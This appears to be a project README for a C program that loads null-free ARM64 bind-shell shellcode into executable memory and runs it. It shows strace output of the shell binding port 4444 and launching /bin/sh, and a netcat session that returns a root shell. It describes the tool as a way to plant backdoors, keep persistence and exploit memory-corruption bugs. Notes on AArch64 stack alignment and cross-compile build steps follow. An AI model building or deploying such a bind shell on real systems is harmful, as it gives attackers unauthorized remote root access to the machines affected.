# arm64_bind_shellcode
C program to map arm64 bind shell code into memory and execute code

## This will only work on target arm64 device. 
## Fixed stack management issues in original assembler code.

Source code for mapping bind shell code into memory and executing the mapped shell code.
The arm64 code was tested on a Raspberry Pi running Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1062-raspi2 aarch64).

## License

Please see the (LICENSE) file for the exact details.

## bind-shellcode-mapped 

## About

The C program bind-shellcode-mapped loads an array of arm-64 bind shell code and execute in memory mapped location.  After relocating the shell code this code is invoked as a C function. A bind shell is a shell that binds to a specific port on the target host to listen for incoming connections.

A bind shell is used to create a listening port on a target machine, that can be later accessed via the network and interact with a system shell. This is a common technique for creating backdoors and maintaining persistence on a target machine.

This will demonstrate how to create a bind shell then move further to create the bind shell and map it into memory.  This program will accept incoming connection a execute a shell to the remote connection.

Now the shell code assembler source code has been modified to directly perform the system call by substituting the execve with the linux system call number.  Additionally, the null bytes have been removed from the code.  This will allow the shell code to be used to exploit memory corruption vulnerabilities.

This program can be ran as a shell or root user.

In the first terminal on the arm64 trget start the bind shell code mapped program

    On the Target run the bind-shellcode-mapped program
    Start the server as root on the target
    $ su
    passphrase
    # strace -e execve,socket,bind,listen,accept,dup2 ./bind-shellcode-mapped 
    execve("./bind-shellcode-mapped", ["./bind-shellcode-mapped"], 0xfffff57e5850 /* 19 vars */) = 0
    Shellcode Length: 164 Bytes
    socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
    listen(3, 2)                            = 0
    accept(3, NULL, NULL)                   = 4
    execve("/bin/sh", NULL, NULL)           = 0
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=15079, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=15080, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    +++ exited with 0 +++

In another terminal on the arm64 target use netstat to identify the active ports on the target.   The program bind-shell can be seen running on port 4444.  Next start netcat to connect to port 4444.  If the connection succeeds user interaction will reveal a root shell (without prompt) as shown below.
       
    $ netstat -tlpn
    (Not all processes could be identified, non-owned process info
    will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    
    $ netcat -nv 0.0.0.0 4444
    Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
    whoami 
    root
    id
    exit

## Stack Management Issues

For AArch64, sp must be 16-byte aligned whenever it is used to access memory. This is enforced by AArch64 hardware.

// Broken AArch64 implementation of `push {x1}; push {x0};`.
str   x1, [sp, #-8]!  // This works, but leaves `sp` with only 8-byte alignment
str   x0, [sp, #-8]!  // ... so the second `str` will fail.

C compilers will typically reserve stack space at the start of the function, then leave sp alone until the end, so the restriction is not as awkward as it first seems. However, you must be aware of it when handling assembly code.

It sounds wasteful – and in most cases it is – but the simplest way to handle the stack pointer can be to push each value to a 16-byte slot. This doubles the stack usage (for pointer-sized values), and it effectively reduces the available memory bandwidth. It is also awkward to implement multiple-register operations using this scheme, since each register requires a separate instruction.

## Sources: sc_mapped

Credit to Ken Kitahara for the use of his source code.

https://packetstormsecurity.com/files/153461/Linux-ARM64-Bind-4444-TCP-Shell-bin-sh-Null-Free-Shellcode.html

Max Compston, Embedded Software Solutions.

## Building this Release

The source code for this program is built using CMake.  

The source code for the arm64 target are cross compiled using gnu arm64 compiler, below.  First in install the cross-compiler on the host.

$ sudo apt-get install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu

Next, set up the host to cross-compile arm64 creating a toolchain-aarch64-linux-gnu.cmake file in your home directory.  Add the following:

#- this one is important
SET(CMAKE_SYSTEM_NAME Linux)
SET(CMAKE_SYSTEM_PROCESSOR arm64)

#- specify the cross compiler
SET(CMAKE_C_COMPILER   /usr/bin/aarch64-linux-gnu-gcc)
SET(CMAKE_CXX_COMPILER /usr/bin/aarch64-linux-gnu-g++)

#- where is the target environment
SET(CMAKE_FIND_ROOT_PATH  /user/aarch64-linux-gnu)

#- search for programs in the build host directories
SET(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)

#- for libraries and headers in the target directories
SET(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
SET(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)

To build the cross-compiled arm64 program navigate to the build directory and run cmake as follows:

$ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
